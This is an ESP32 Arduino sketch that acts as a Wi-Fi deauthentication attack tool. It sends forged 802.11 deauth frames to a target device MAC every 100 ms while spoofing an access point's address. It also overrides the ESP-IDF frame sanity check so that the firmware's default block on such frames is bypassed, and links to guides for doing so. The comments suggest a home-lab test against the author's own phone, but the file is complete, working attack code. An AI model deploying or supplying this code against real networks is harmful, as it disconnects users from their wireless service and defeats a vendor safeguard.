
#include <WiFi.h>
#include "esp_wifi.h"

//uint8_t victim_mac[6] = {0x7E,0x31,0x57,0xA8,0x9F,0x1E};
// uint8_t ap_mac[6]     = {0xA0, 0xDD, 0x6C, 0x85, 0xEA, 0x51};  // House's router
//uint8_t ap_mac[6]     = {0xA0, 0xDD, 0x6C, 0x85, 0xEA, 0x51};  // ESP32 Dev MAC

// Check victim's, APs MACs, as well as channel in WiFi Pineapple
// Make sure that MAC randomization is turned off, HW MAC being used
uint8_t victim_mac[6] = {0xf8, 0xad, 0xcb, 0x0f, 0xf1, 0x79};  // Your phone MAC
uint8_t ap_mac[6] = {0x08, 0xA6, 0xF7, 0x23, 0x72, 0x9D}; // ESP32 CYD MAC
#define CHANNEL 11

#define SEND_INTERVAL 100

// ESP-IDF disables deauth transmitting by default.
// To make sure frames with frame control = 0xc0 (deauth) are transmitted, make sure to
// follow the steps in these links according to your platfom (Linux/Windows/MacOS)
// https://www.reddit.com/r/WillStunForFood/comments/ot8vzl/finally_got_the_esp32_to_send_deauthentication/
// https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup#if-you-are-following-these-instructions-you-do-not-need-to-do-this
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}

void printMAC(const uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) Serial.print("0");
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}

void sendDeauth(uint8_t *ap, uint8_t *client) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00,              // Type/Subtype: Deauth
    0x00, 0x00,              // Duration
    // dst addr (victim)
    0, 0, 0, 0, 0, 0,
    // src addr (AP)
    0, 0, 0, 0, 0, 0,
    // BSSID (AP)
    0, 0, 0, 0, 0, 0,
    0x00, 0x00,              // Seq number
    0x07, 0x00               // Reason code
  };

  memcpy(&deauthPacket[4],  client, 6);  // Destination (victim)
  memcpy(&deauthPacket[10], ap, 6);      // Source (AP)
  memcpy(&deauthPacket[16], ap, 6);      // BSSID (AP)

  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  WiFi.mode(WIFI_MODE_AP);
  esp_wifi_set_channel(CHANNEL, WIFI_SECOND_CHAN_NONE);

  // Get and print ESP32 MAC
  uint8_t esp_mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, esp_mac);

  Serial.print("ESP32 AP MAC address: ");
  printMAC(esp_mac);

  Serial.print("Using channel: ");
  Serial.println(CHANNEL);

  Serial.println("Sending deauth frames...");
}

void loop() {
  sendDeauth(ap_mac, victim_mac);
  delay(SEND_INTERVAL);
}
